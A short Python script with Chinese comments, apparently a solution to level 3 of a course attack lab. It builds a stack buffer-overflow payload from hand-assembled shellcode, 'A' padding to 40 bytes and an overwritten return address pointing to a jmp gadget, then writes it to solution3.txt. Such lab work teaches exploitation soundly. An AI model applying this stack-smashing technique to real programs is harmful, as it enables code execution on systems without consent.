# 构造Shellcode
# mov $0x72, %edi       => \xbf\x72\x00\x00\x00
# mov $0x401216, %rax   => \x48\xc7\xc0\x16\x12\x40\x00 (这里用movabs或者mov均可，机器码略有不同但效果一样)
# call *%rax            => \xff\xd0

shellcode = b"\xbf\x72\x00\x00\x00\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00\xff\xd0"

# 计算Padding长度，总长度需为40字节
padding_len = 40 - len(shellcode)
padding = b"A" * padding_len

# jmp_xs 的地址，作为返回地址
jmp_xs_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"

payload = shellcode + padding + jmp_xs_addr

with open("solution3.txt", "wb") as f:
    f.write(payload)
print("Payload written to solution3.txt")